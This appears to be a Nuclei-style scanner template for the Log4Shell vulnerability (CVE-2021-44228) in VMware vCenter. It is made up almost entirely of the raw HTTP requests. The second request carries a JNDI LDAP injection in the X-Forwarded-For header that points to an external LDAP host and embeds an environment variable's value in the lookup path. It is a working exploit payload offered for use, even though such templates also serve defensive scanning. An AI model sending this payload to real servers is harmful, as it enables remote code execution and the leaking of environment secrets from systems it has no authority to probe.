id: CVE-2021-44228-vcenter-exploit
info:
  name: VMware VCenter Log4j JNDI RCE
  author: eric@horizon3.ai 
  severity: high
  description: A critical vulnerability in Apache Log4j identified by CVE-2021-44228 has been publicly disclosed that may allow for remote code execution in impacted VMware VCenter.
  reference:
    - https://twitter.com/tnpitsecurity/status/1469429810216771589
    - https://www.vmware.com/security/advisories/VMSA-2021-0028.html
  tags: rce,jndi,log4shell,log4j,vcenter,oob

requests:
  - raw:
      - |
        GET /ui/login HTTP/1.1

      - |
        GET {{websso-url}} HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:95.0) Gecko/20100101 Firefox/95.0
        X-Forwarded-For: ${jndi:ldap://{{ldap-ip-port}}/{{base-path}}/{{env-var}}/${{{env-var}}}}
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
        Upgrade-Insecure-Requests: 1
  
    extractors:
      - type: regex
        part: header
        name: websso-url
        internal: true
        group: 1
        regex:
          - '(/websso(.*)(SAMLRequest=))'
